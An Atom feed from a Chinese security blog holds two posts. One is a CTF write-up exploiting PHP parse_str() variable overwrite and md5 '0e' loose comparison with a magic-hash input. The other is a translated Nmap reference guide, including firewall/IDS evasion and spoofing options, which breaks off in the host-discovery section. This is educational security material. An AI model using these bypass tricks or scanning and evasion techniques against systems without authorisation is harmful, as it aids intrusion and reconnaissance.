<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hackfun - | Secblog | Pentest | Auditing | Sectool | CTF Write-up</title>
  <icon>https://www.gravatar.com/avatar/fa00ae710729f4b21e97bcbd3734b9cb</icon>
  <subtitle>Network Security Blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://sunnyelf.github.io/"/>
  <updated>2017-09-29T20:00:57.124Z</updated>
  <id>https://sunnyelf.github.io/</id>
  
  <author>
    <name>Jing Ling</name>
    <email>jingling@hackfun.org</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP CTF tricks parse_str and loose comparison</title>
    <link href="https://sunnyelf.github.io/2017/09/29/PHP-CTF-tricks-parse-str-and-loose-comparison/"/>
    <id>https://sunnyelf.github.io/2017/09/29/PHP-CTF-tricks-parse-str-and-loose-comparison/</id>
    <published>2017-09-29T15:31:11.000Z</published>
    <updated>2017-09-29T20:00:57.124Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">'str'</span>])) &#123;</div><div class="line">    show_source(<span class="keyword">__FILE__</span>);</div><div class="line">    <span class="keyword">die</span>();</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</div><div class="line">    $url = <span class="string">"www.hackfun.org"</span>;</div><div class="line">    $str = $_GET[<span class="string">'str'</span>];</div><div class="line">    @parse_str($str);</div><div class="line">    <span class="keyword">if</span> ($url[<span class="number">0</span>] != <span class="string">'QNKCDZO'</span> &amp;&amp; md5($url[<span class="number">0</span>]) == md5(<span class="string">'QNKCDZO'</span>)) &#123;</div><div class="line">        <span class="keyword">echo</span> $flag;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">exit</span>(<span class="string">'Try angain :-)'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>要得到flag首先要使<code>if ($url[0] != &#39;QNKCDZO&#39; &amp;&amp; md5($url[0]) == md5(&#39;QNKCDZO&#39;))</code>成立，也就是<code>$url[0] != &#39;QNKCDZO&#39;</code>和<code>md5($url[0]) == md5(&#39;QNKCDZO&#39;)</code>都成立，如果str正常传入情况下，<code>$url[0]</code>的值是’w’，满足第一个条件<code>$url[0] != &#39;QNKCDZO&#39;</code>，但是不满足<code>md5($url[0]) == md5(&#39;QNKCDZO&#39;)</code>，但是代码中写了<code>@parse_str($str)</code>;，而<a href="http://www.w3school.com.cn/php/func_string_parse_str.asp" target="_blank" rel="external">parse_str()</a>函数会把参数字符串当做php变量解析，也就是如果str传入的是<code>url[0]=hello</code>，那么就会解析成一个数组url，且数组url的第一个值为hello，此时<code>$url[0] != &#39;QNKCDZO&#39;</code>成立，<code>md5($url[0]) == md5(&#39;QNKCDZO&#39;)</code>不成立，但是至少<code>$url[0]</code>的值可控了，仔细研究<code>md5($url[0]) == md5(&#39;QNKCDZO&#39;)</code>，可以发现<code>md5(&#39;QNKCDZO&#39;)</code>的值为字符型的’0e830400451993494058024219903391’，但是根据<a href="http://php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="external">PHP手册</a>的描述：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。其中0e是科学计数法，因为涉及到数字内容，所以就会转换为数值，而’0e830400451993494058024219903391’转换为数值也就是0*(10^830400451993494058024219903391) = 0，所以我们只需要使<code>url[0]</code>的MD5值为类似0e开头后面全为数字的字符串就可以让<code>md5($url[0]) == md5(&#39;QNKCDZO&#39;)</code>成立，通过搜索发现很多字符串都满足条件，具体满足条件的列表可看。</p><ul><li><a href="http://blog.csdn.net/kalbertlee/article/details/70213392" target="_blank" rel="external">0e开头MD5 python生成脚本 PHP哈希弱类型比较缺陷</a></li><li><a href="http://www.cnblogs.com/Primzahl/p/6018158.html" target="_blank" rel="external">PHP处理0e开头md5哈希字符串缺陷/bug</a></li></ul><p>我们选取240610708作为<code>url[0]</code>的值，也就是使str传入的值为<code>url[0]=240610708</code>，此时<code>$url[0] != &#39;QNKCDZO&#39;</code>成立，且<code>md5($url[0]) == md5(&#39;QNKCDZO&#39;)</code>也成立：</p><p><img src="/2017/09/29/PHP-CTF-tricks-parse-str-and-loose-comparison/flag.jpg" alt="flag"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-题目&quot;&gt;&lt;a href=&quot;#0x00-题目&quot; class=&quot;headerlink&quot; title=&quot;0x00 题目&quot;&gt;&lt;/a&gt;0x00 题目&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g
      
    
    </summary>
    
    
      <category term="PHP CTF tricks" scheme="https://sunnyelf.github.io/tags/PHP-CTF-tricks/"/>
    
      <category term="parse_str" scheme="https://sunnyelf.github.io/tags/parse-str/"/>
    
      <category term="loose comparison" scheme="https://sunnyelf.github.io/tags/loose-comparison/"/>
    
  </entry>
  
  <entry>
    <title>Nmap参考指南</title>
    <link href="https://sunnyelf.github.io/2017/04/24/Nmap%E5%8F%82%E8%80%83%E6%8C%87%E5%8D%97/"/>
    <id>https://sunnyelf.github.io/2017/04/24/Nmap参考指南/</id>
    <published>2017-04-24T08:59:00.000Z</published>
    <updated>2017-10-02T20:10:15.633Z</updated>
    
    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/sunnyelf/Nmap-Reference-Guide" target="_blank" rel="external">Nmap-Reference-Guide</a></p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul><li><a href="#译注">译注</a></li><li><a href="#名称">名称</a></li><li><a href="#命令">命令</a></li><li><a href="#描述">描述</a></li><li><a href="#选项概要">选项概要</a></li><li><a href="#目标说明">目标说明</a></li><li><a href="#主机发现">主机发现</a></li><li><a href="#端口扫描基础">端口扫描基础</a></li><li><a href="#端口扫描技术">端口扫描技术</a></li><li><a href="#端口说明和扫描顺序">端口说明和扫描顺序</a></li><li><a href="#服务和版本探测">服务和版本探测</a></li><li><a href="#操作系统探测">操作系统探测</a></li><li><a href="#时间和性能">时间和性能</a></li><li><a href="#防火墙ids躲避和欺骗">防火墙/IDS躲避和欺骗</a></li><li><a href="#输出">输出</a></li><li><a href="#其它选项">其它选项</a></li><li><a href="#运行时交互">运行时交互</a></li><li><a href="#实例">实例</a></li><li><a href="#bugs">Bugs</a></li><li><a href="#作者">作者</a></li><li><a href="#法律事项版权许可证担保缺出口限制">法律事项(版权、许可证、担保(缺)、出口限制)</a></li></ul><a id="more"></a><h1 id="译注"><a href="#译注" class="headerlink" title="译注"></a>译注</h1><p>该Nmap参考指南中文版由<a href="mailto:fyang1024@gmail.com" target="_blank" rel="external">Fei Yang</a>和<a href="mailto:lilei_721@6611.org" target="_blank" rel="external">Lei Li</a> 从<a href="http://www.insecure.org/nmap/man/" target="_blank" rel="external">英文版本</a>翻译而来。 我们希望这将使全世界使用中文的人们更了解Nmap，但我们不能保证该译本和官方的 英文版本一样完整，也不能保证同步更新。 它可以在<a href="http://creativecommons.org/licenses/by/2.5/" target="_blank" rel="external">Creative Commons Attribution License</a>许可证下被修改并重新发布。</p><h1 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h1><p>nmap — 网络探测工具和安全/端口扫描器</p><h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><p>nmap [ &lt;扫描类型&gt; …] [ &lt;选项&gt; ] { &lt;扫描目标说明&gt; }</p><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><strong>注意</strong>:本文档描述了Nmap版本4.50。最新文档以英语 <a href="https://nmap.org/book/man.html" target="_blank" rel="external">https://nmap.org/book/man.html</a>提供。</p><p>Nmap (“Network Mapper(网络映射器)”) 是一款开放源代码的 网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，当然用它扫描单个 主机也没有问题。Nmap以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些 主机提供什么服务(应用程序名和版本)，那些服务运行在什么操作系统(包括版本信息)， 它们使用什么类型的报文过滤器/防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核， 许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息， 管理服务升级计划，以及监视主机和服务的运行。</p><p>Nmap输出的是扫描目标的列表，以及每个目标的补充信息，至于是哪些信息则依赖于所使用的选项。 “所感兴趣的端口表格”是其中的关键。那张表列出端口号，协议，服务名称和状态。状态可能是 open(开放的)，filtered(被过滤的)， closed(关闭的)，或者unfiltered(未被过滤的)。 Open(开放的)意味着目标机器上的应用程序正在该端口监听连接/报文。 filtered(被过滤的) 意味着防火墙，过滤器或者其它网络障碍阻止了该端口被访问，Nmap无法得知 它是 open(开放的) 还是 closed(关闭的)。 closed(关闭的) 端口没有应用程序在它上面监听，但是他们随时可能开放。 当端口对Nmap的探测做出响应，但是Nmap无法确定它们是关闭还是开放时，这些端口就被认为是 unfiltered(未被过滤的) 如果Nmap报告状态组合 open|filtered 和 closed|filtered时，那说明Nmap无法确定该端口处于两个状态中的哪一个状态。 当要求进行版本探测时，端口表也可以包含软件的版本信息。当要求进行IP协议扫描时 (-sO)，Nmap提供关于所支持的IP协议而不是正在监听的端口的信息。</p><p>除了所感兴趣的端口表，Nmap还能提供关于目标机的进一步信息，包括反向域名，操作系统猜测，设备类型，和MAC地址。</p><p>一个典型的Nmap扫描如例 1 “一个典型的Nmap扫描”所示。在这个例子中，唯一的选项是-A， 用来进行操作系统及其版本的探测，-T4 可以加快执行速度，接着是两个目标主机名。</p><p><strong>例 1. 一个典型的Nmap扫描</strong></p><pre><code># nmap -A -T4 scanme.nmap.orgNmap scan report for scanme.nmap.org (74.207.244.221)Host is up (0.029s latency).rDNS record for 74.207.244.221: li86-221.members.linode.comNot shown: 995 closed portsPORT     STATE    SERVICE     VERSION22/tcp   open     ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (protocol 2.0)| ssh-hostkey: 1024 8d:60:f1:7c:ca:b7:3d:0a:d6:67:54:9d:69:d9:b9:dd (DSA)|_2048 79:f8:09:ac:d4:e2:32:42:10:49:d3:bd:20:82:85:ec (RSA)80/tcp   open     http        Apache httpd 2.2.14 ((Ubuntu))|_http-title: Go ahead and ScanMe!646/tcp  filtered ldp1720/tcp filtered H.323/Q.9319929/tcp open     nping-echo  Nping echoDevice type: general purposeRunning: Linux 2.6.XOS CPE: cpe:/o:linux:linux_kernel:2.6.39OS details: Linux 2.6.39Network Distance: 11 hopsService Info: OS: Linux; CPE: cpe:/o:linux:kernelTRACEROUTE (using port 53/tcp)HOP RTT      ADDRESS[Cut first 10 hops for brevity]11  17.65 ms li86-221.members.linode.com (74.207.244.221)Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds</code></pre><h1 id="选项概要"><a href="#选项概要" class="headerlink" title="选项概要"></a>选项概要</h1><p>当 Nmap 不带选项运行时，该选项概要会被输出，最新的版本在这里 <a href="http://www.insecure.org/nmap/data/nmap.usage.txt" target="_blank" rel="external">http://www.insecure.org/nmap/data/nmap.usage.txt</a>。它帮助人们记住最常用的选项，但不 能替代本手册其余深入的文档，一些晦涩的选项甚至不在这里。</p><pre><code>Usage: nmap [Scan Type(s)] [Options] {target specification}TARGET SPECIFICATION:    Can pass hostnames, IP addresses, networks, etc.    Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0-255.0-255.1-254    -iL &lt;inputfilename&gt;: Input from list of hosts/networks    -iR &lt;num hosts&gt;: Choose random targets    --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks    --excludefile &lt;exclude_file&gt;: Exclude list from fileHOST DISCOVERY:    -sL: List Scan - simply list targets to scan    -sP: Ping Scan - go no further than determining if host is online    -P0: Treat all hosts as online -- skip host discovery    -PS/PA/PU [portlist]: TCP SYN/ACK or UDP discovery probes to given ports    -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes    -n/-R: Never do DNS resolution/Always resolve [default: sometimes resolve]SCAN TECHNIQUES:    -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans    -sN/sF/sX: TCP Null, FIN, and Xmas scans    --scanflags &lt;flags&gt;: Customize TCP scan flags    -sI &lt;zombie host[:probeport]&gt;: Idlescan    -sO: IP protocol scan    -b &lt;ftp relay host&gt;: FTP bounce scanPORT SPECIFICATION AND SCAN ORDER:    -p &lt;port ranges&gt;: Only scan specified ports    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080    -F: Fast - Scan only the ports listed in the nmap-services file)    -r: Scan ports consecutively - don&apos;t randomizeSERVICE/VERSION DETECTION:    -sV: Probe open ports to determine service/version info    --version-light: Limit to most likely probes for faster identification    --version-all: Try every single probe for version detection    --version-trace: Show detailed version scan activity (for debugging)OS DETECTION:    -O: Enable OS detection    --osscan-limit: Limit OS detection to promising targets    --osscan-guess: Guess OS more aggressivelyTIMING AND PERFORMANCE:    -T[0-6]: Set timing template (higher is faster)    --min-hostgroup/max-hostgroup &lt;msec&gt;: Parallel host scan group sizes    --min-parallelism/max-parallelism &lt;msec&gt;: Probe parallelization    --min_rtt_timeout/max-rtt-timeout/initial-rtt-timeout &lt;msec&gt;: Specifies probe round trip time.    --host-timeout &lt;msec&gt;: Give up on target after this long    --scan-delay/--max_scan-delay &lt;msec&gt;: Adjust delay between probesFIREWALL/IDS EVASION AND SPOOFING:    -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)    -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys    -S &lt;IP_Address&gt;: Spoof source address    -e &lt;iface&gt;: Use specified interface    -g/--source-port &lt;portnum&gt;: Use given port number    --data-length &lt;num&gt;: Append random data to sent packets    --ttl &lt;val&gt;: Set IP time-to-live field    --spoof-mac &lt;mac address, prefix, or vendor name&gt;: Spoof your MAC addressOUTPUT:    -oN/-oX/-oS/-oG &lt;file&gt;: Output scan results in normal, XML, s|&lt;rIpt kIddi3, and Grepable format, respectively, to the given filename.    -oA &lt;basename&gt;: Output in the three major formats at once    -v: Increase verbosity level (use twice for more effect)    -d[level]: Set or increase debugging level (Up to 9 is meaningful)    --packet-trace: Show all packets sent and received    --iflist: Print host interfaces and routes (for debugging)    --append-output: Append to rather than clobber specified output files    --resume &lt;filename&gt;: Resume an aborted scan    --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML    --no_stylesheet: Prevent Nmap from associating XSL stylesheet w/XML outputMISC:    -6: Enable IPv6 scanning    -A: Enables OS detection and Version detection    --datadir &lt;dirname&gt;: Specify custom Nmap data file location    --send-eth/--send-ip: Send packets using raw ethernet frames or IP packets    --privileged: Assume that the user is fully privileged    -V: Print version number    -h: Print this help summary page.EXAMPLES:    nmap -v -A scanme.nmap.org    nmap -v -sP 192.168.0.0/16 10.0.0.0/8    nmap -v -iR 10000 -P0 -p 80</code></pre><h1 id="目标说明"><a href="#目标说明" class="headerlink" title="目标说明"></a>目标说明</h1><p>除了选项，所有出现在Nmap命令行上的都被视为对目标主机的说明。 最简单的情况是指定一个目标IP地址或主机名。</p><p>有时候您希望扫描整个网络的相邻主机。为此，Nmap支持CIDR风格的地址。您可以附加 一个/<numbit>在一个IP地址或主机名后面， Nmap将会扫描所有和该参考IP地址具有<numbit>相同比特的所有IP地址或主机。 例如，192.168.10.0/24将会扫描192.168.10.0 (二进制格式: 11000000 10101000 00001010 00000000)和192.168.10.255 (二进制格式: 11000000 10101000 00001010 11111111)之间的256台主机。 192.168.10.40/24 将会做同样的事情。假设主机 scanme.nmap.org的IP地址是205.217.153.62， scanme.nmap.org/16 将扫描205.217.0.0和205.217.255.255之间的65,536 个IP地址。 所允许的最小值是/1， 这将会扫描半个互联网。最大值是/32，这将会扫描该主机或IP地址， 因为所有的比特都固定了。</numbit></numbit></p><p>CIDR标志位很简洁但有时候不够灵活。例如，您也许想要扫描 192.168.0.0/16，但略过任何以.0或者.255 结束的IP地址，因为它们通常是广播地址。 Nmap通过八位字节地址范围支持这样的扫描 您可以用逗号分开的数字或范围列表为IP地址的每个八位字节指定它的范围。 例如，192.168.0-255.1-254 将略过在该范围内以.0和.255结束的地址。 范围不必限于最后的8位：0-255.0-255.13.37 将在整个互联网范围内扫描所有以13.37结束的地址。 这种大范围的扫描对互联网调查研究也许有用。</p><p>IPv6地址只能用规范的IPv6地址或主机名指定。 CIDR 和八位字节范围不支持IPv6，因为它们对于IPv6几乎没什么用。</p><p>Nmap命令行接受多个主机说明，它们不必是相同类型。命令<strong>nmap scanme.nmap.org 192.168.0.0/8 10.0.0，1，3-7.0-255</strong>将和您预期的一样执行。</p><p>虽然目标通常在命令行指定，下列选项也可用来控制目标的选择：</p><p><strong>-iL<inputfilename>(从列表中输入)</inputfilename></strong></p><p>从 <em><inputfilename></inputfilename></em>中读取目标说明。在命令行输入 一堆主机名显得很笨拙，然而经常需要这样。 例如，您的DHCP服务器可能导出10,000个当前租约的列表，而您希望对它们进行 扫描。如果您不是使用未授权的静态IP来定位主机，或许您想要扫描所有IP地址。 只要生成要扫描的主机的列表，用-iL 把文件名作为选项传给Nmap。列表中的项可以是Nmap在 命令行上接受的任何格式(IP地址，主机名，CIDR，IPv6，或者八位字节范围)。 每一项必须以一个或多个空格，制表符或换行符分开。 如果您希望Nmap从标准输入而不是实际文件读取列表， 您可以用一个连字符(-)作为文件名。</p><p><strong>-iR<hostnum>(随机选择目标)</hostnum></strong></p><p>对于互联网范围内的调查和研究， 您也许想随机地选择目标。 <em><hostnum></hostnum></em>选项告诉 Nmap生成多少个IP。不合需要的IP如特定的私有，组播或者未分配的地址自动 略过。选项 0 意味着永无休止的扫描。记住，一些网管对于未授权的扫描可能会很感冒并加以抱怨。 使用该选项的后果自负! 如果在某个雨天的下午，您觉得实在无聊， 试试这个命令nmap -sS -PS80 -iR 0 -p 80随机地找一些网站浏览。</p><p><strong>–exclude<host1 [,host2][,host3],...="">(排除主机/网络)</host1></strong></p><p>如果在您指定的扫描范围有一些主机或网络不是您的目标， 那就用该选项加上以逗号分隔的列表排除它们。该列表用正常的Nmap语法， 因此它可以包括主机名，CIDR，八位字节范围等等。 当您希望扫描的网络包含执行关键任务的服务器，已知的对端口扫描反应强烈的 系统或者被其它人看管的子网时，这也许有用。</p><p><strong>–excludefile<excludefile>(排除文件中的列表)</excludefile></strong></p><p>这和–exclude 选项的功能一样，只是所排除的目标是用以 换行符，空格，或者制表符分隔的 <em><excludefile></excludefile></em>提供的，而不是在命令行上输入的。</p><h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><p>任何网络探测任务的最初几个步骤之一就是把一组IP范围(有时该范围是巨大的)缩小为 一列活动的或者您感兴趣的主机。扫描每个IP的每个端口很慢，通常也没必要。当然，什么样的主机令您感兴趣主要依赖于扫描的目的。网管也许只对运行特定服务的 主机感兴趣，而从事安全的人士则可能对一个马桶都感兴趣，只要它有IP地址:-)。一个系统管理员 也许仅仅使用Ping来定位内网上的主机，而一个外部入侵测试人员则可能绞尽脑汁用各种方法试图突破防火墙的封锁。</p><p>由于主机发现的需求五花八门，Nmap提供了一箩筐的选项来定制您的需求。 主机发现有时候也叫做ping扫描，但它远远超越用世人皆知的ping工具 发送简单的ICMP回声请求报文。用户完全可以通过使用列表扫描(-sL)或者 通过关闭ping (-P0)跳过ping的步骤，也可以使用多个端口把TCP SYN/ACK，UDP和ICMP 任意组合起来玩一玩。这些探测的目的是获得响应以显示某个IP地址是否是活动的(正在被某 主机或者网络设备使用)。 在许多网络上，在给定的时间，往往只有小部分的IP地址是活动的。 这种情况在基于RFC1918的私有地址空间如10.0.0.0/8尤其普遍。那个网络有16,000,000个IP，但我见过一些使用它的公司连1000台机器都没有。主机发现能够找到零星分布于IP地址海洋上的那些机器。</p><p>如果没有给出主机发现的选项，Nmap 就发送一个TCP ACK报文到80端口和一个ICMP回声请求到每台目标机器。 一个例外是ARP扫描用于局域网上的任何目标机器。对于非特权UNIX shell用户，使用connect()系统调用会发送一个SYN报文而不是ACK 这些默认行为和使用-PA -PE选项的效果相同。 扫描局域网时，这种主机发现一般够用了，但是对于安全审核，建议进行 更加全面的探测。</p><p>-P选项(用于选择 ping的类型)可以被结合使用。 您可以通过使用不同的TCP端口/标志位和ICMP码发送许多探测报文 来增加穿透防守严密的防火墙的机会。另外要注意的是即使您指定了其它 -P*选项，ARP发现(-PR)对于局域网上的 目标而言是默认行为，因为它总是更快更有效。</p><p>下列选项控制主机发现。</p><p><strong>-sL (列表扫描)</strong></p><p>列表扫描是主机发现的退化形式，它仅仅列出指定网络上的每台主机， 不发送任何报文到目标主机。默认情况下，Nmap仍然对主机进行反向域名解析以获取 它们的名字。简单的主机名能给出的有用信息常常令人惊讶。例如， fw.chi.playboy.com是花花公子芝加哥办公室的 防火墙。Nmap最后还会报告IP地址的总数。列表扫描可以很好的确保您拥有正确的目标IP。 如果主机的域名出乎您的意料，那么就值得进一步检查以防错误地扫描其它组织的网络。</p><p>既然只是打印目标主机的列表，像其它一些高级功能如端口扫描，操作系统探测或者Ping扫描 的选项就没有了。如果您希望关闭ping扫描而仍然执行这样的高级功能，请继续阅读关于 -P0选项的介绍。</p><p><strong>-sP (Ping扫描)</strong></p><p>该选项告诉Nmap仅仅 进行ping扫描 (主机发现)，然后打印出对扫描做出响应的那些主机。 没有进一步的测试 (如端口扫描或者操作系统探测)。 这比列表扫描更积极，常常用于 和列表扫描相同的目的。它可以得到些许目标网络的信息而不被特别注意到。 对于攻击者来说，了解多少主机正在运行比列表扫描提供的一列IP和主机名往往更有价值。</p><p>系统管理员往往也很喜欢这个选项。 它可以很方便地得出 网络上有多少机器正在运行或者监视服务器是否正常运行。常常有人称它为 地毯式ping，它比ping广播地址更可靠，因为许多主机对广播请求不响应。</p><p>-sP选项在默认情况下， 发送一个ICMP回声请求和一个TCP报文到80端口。如果非特权用户执行，就发送一个SYN报文 (用connect()系统调用)到目标机的80端口。 当特权用户扫描局域网上的目标机时，会发送ARP请求(-PR)， ，除非使用了–send-ip选项。 -sP选项可以和除-P0)之外的任何发现探测类型-P* 选项结合使用以达到更大的灵活性。 一旦使用了任何探测类型和端口选项，默认的探测(ACK和回应请求)就被覆盖了。 当防守严密的防火墙位于运行Nmap的源主机和目标网络之间时， 推荐使用那些高级选项。否则，当防火墙捕获并丢弃探测包或者响应包时，一些主机就不能被探测到。</p><p><strong>-P0 (无ping)</strong></p><p>该选项完全跳过Nmap发现阶段。 通常Nmap在进行高强度的扫描时用它确定正在运行的机器。 默认情况下，Nmap只对正在运行的主机进行高强度的探测如 端口扫描，版本探测，或者操作系统探测。用-P0禁止 主机发现会使Nmap对每一个指定的目标IP地址 进行所要求的扫描。所以如果在命令行指定一个B类目标地址空间(/16)， 所有 65,536 个IP地址都会被扫描。 -P0的第二个字符是数字0而不是字母O。 和列表扫描一样，跳过正常的主机发现，但不是打印一个目标列表， 而是继续执行所要求的功能，就好像每个IP都是活动的。</p><p><strong>-PS [portlist] (TCP SYN Ping)</strong></p><p>该选项发送一个设置了SYN标志位的空TCP报文。 默认目的端口为80 (可以通过改变nmap.h) 文件中的DEFAULT-TCP-PROBE-PORT值进行配置，但不同的端口也可以作为选项指定。 甚至可以指定一个以逗号分隔的端口列表(如 -PS22，23，25，80，113，1050，35000)， 在这种情况下，每个端口会被并发地扫描。</p><p>SYN标志位告诉对方您正试图建立一个连接。 通常目标端口是关闭的，一个RST (复位) 包会发回来。 如果碰巧端口是开放的，目标会进行TCP三步握手的第二步，回应 一个SYN/ACK TCP报文。然后运行Nmap的机器则会扼杀这个正在建立的连接， 发送一个RST而非ACK报文，否则，一个完全的连接将会建立。 RST报文是运行Nmap的机器而不是Nmap本身响应的，因为它对收到 的SYN/ACK感到很意外。</p><p>Nmap并不关心端口开放还是关闭。 无论RST还是SYN/ACK响应都告诉Nmap该主机正在运行。</p><p>在UNIX机器上，通常只有特权用户 root 能否发送和接收 原始的TCP报文。因此作为一个变通的方法，对于非特权用户， Nmap会为每个目标主机进行系统调用connect()，它也会发送一个SYN 报文来尝试建立连接。如果connect()迅速返回成功或者一个ECONNREFUSED 失败，下面的TCP堆栈一定已经收到了一个SYN/ACK或者RST，该主机将被 标志位为在运行。 如果连接超时了，该主机就标志位为down掉了。这种方法也用于IPv6 连接，因为Nmap目前还不支持原始的IPv6报文。</p><p><strong>-PA [portlist] (TCP ACK Ping)</strong></p><p>TCP ACK ping和刚才讨论的SYN ping相当类似。 也许您已经猜到了，区别就是设置TCP的ACK标志位而不是SYN标志位。 ACK报文表示确认一个建立连接的尝试，但该连接尚未完全建立。 所以远程主机应该总是回应一个RST报文， 因为它们并没有发出过连接请求到运行Nmap的机器，如果它们正在运行的话。</p><p>-PA选项使用和SYN探测相同的默认端口(80)，也可以 用相同的格式指定目标端口列表。如果非特权用户尝试该功能， 或者指定的是IPv6目标，前面说过的connect()方法将被使用。 这个方法并不完美，因为它实际上发送的是SYN报文，而不是ACK报文。</p><p>提供SYN和ACK两种ping探测的原因是使通过防火墙的机会尽可能大。 许多管理员会配置他们的路由器或者其它简单的防火墙来封锁SYN报文，除非 连接目标是那些公开的服务器像公司网站或者邮件服务器。 这可以阻止其它进入组织的连接，同时也允许用户访问互联网。 这种无状态的方法几乎不占用防火墙/路由器的资源，因而被硬件和软件过滤器 广泛支持。Linux Netfilter/iptables 防火墙软件提供方便的 –syn选项来实现这种无状态的方法。 当这样的无状态防火墙规则存在时，发送到关闭目标端口的SYN ping探测 (-PS) 很可能被封锁。这种情况下，ACK探测格外有闪光点，因为它正好利用了 这样的规则。</p><p>另外一种常用的防火墙用有状态的规则来封锁非预期的报文。 这一特性已开始只存在于高端防火墙，但是这些年类它越来越普遍了。 Linux Netfilter/iptables 通过 –state选项支持这一特性，它根据连接状态把报文 进行分类。SYN探测更有可能用于这样的系统，由于没头没脑的ACK报文 通常会被识别成伪造的而丢弃。解决这个两难的方法是通过即指定 -PS又指定-PA来即发送SYN又发送ACK。</p><p><strong>-PU [portlist] (UDP Ping)</strong></p><p>还有一个主机发现的选项是UDP ping，它发送一个空的(除非指定了–data-length UDP报文到给定的端口。端口列表的格式和前面讨论过的-PS和-PA选项还是一样。 如果不指定端口，默认是31338。该默认值可以通过在编译时改变nmap.h文件中的 DEFAULT-UDP-PROBE-PORT值进行配置。默认使用这样一个奇怪的端口是因为对开放端口 进行这种扫描一般都不受欢迎。</p><p>如果目标机器的端口是关闭的，UDP探测应该马上得到一个ICMP端口无法到达的回应报文。 这对于Nmap意味着该机器正在运行。 许多其它类型的ICMP错误，像主机/网络无法到达或者TTL超时则表示down掉的或者不可到达的主机。 没有回应也被这样解释。如果到达一个开放的端口，大部分服务仅仅忽略这个 空报文而不做任何回应。这就是为什么默认探测端口是31338这样一个 极不可能被使用的端口。少数服务如chargen会响应一个空的UDP报文， 从而向Nmap表明该机器正在运行。</p><p>该扫描类型的主要优势是它可以穿越只过滤TCP的防火墙和过滤器。 例如。我曾经有过一个Linksys BEFW11S4无线宽带路由器。默认情况下， 该设备对外的网卡过滤所有TCP端口，但UDP探测仍然会引发一个端口不可到达 的消息，从而暴露了它自己。</p><p><strong>-PE; -PP; -PM (ICMP Ping Types)</strong></p><p>除了前面讨论的这些不常见的TCP和UDP主机发现类型， Nmap也能发送世人皆知的ping 程序所发送的报文。Nmap发送一个ICMP type 8 (回声请求)报文到目标IP地址， 期待从运行的主机得到一个type 0 (回声响应)报文。 对于网络探索者而言，不幸的是，许多主机和 防火墙现在封锁这些报文，而不是按期望的那样响应， 参见<a href="http://www.rfc-editor.org/rfc/rfc1122.txt" target="_blank" rel="external">RFC 1122</a>。因此，仅仅ICMP扫描对于互联网上的目标通常是不够的。 但对于系统管理员监视一个内部网络，它们可能是实际有效的途径。 使用-PE选项打开该回声请求功能。</p><p>虽然回声请求是标准的ICMP ping查询， Nmap并不止于此。ICMP标准 (<a href="http://www.rfc-editor.org/rfc/rfc792.txt" target="_blank" rel="external">RFC 792</a>)还规范了时间戳请求，信息请求 request，和地址掩码请求，它们的代码分别是13，15和17。 虽然这些查询的表面目的是获取信息如地址掩码和当前时间， 它们也可以很容易地用于主机发现。 很简单，回应的系统就是在运行的系统。Nmap目前没有实现信息请求报文， 因为它们还没有被广泛支持。RFC 1122 坚持 “主机不应该实现这些消息”。 时间戳和地址掩码查询可以分别用-PP和-PM选项发送。 时间戳响应(ICMP代码14)或者地址掩码响应(代码18)表示主机在运行。 当管理员特别封锁了回声请求报文而忘了其它ICMP查询可能用于 相同目的时，这两个查询可能很有价值。</p><p><strong>-PR (ARP Ping)</strong></p><p>最常见的Nmap使用场景之一是扫描一个以太局域网。在大部分局域网上，特别是那些使用基于 RFC1918私有地址范围的网络，在一个给定的时间绝大部分 IP地址都是不使用的。 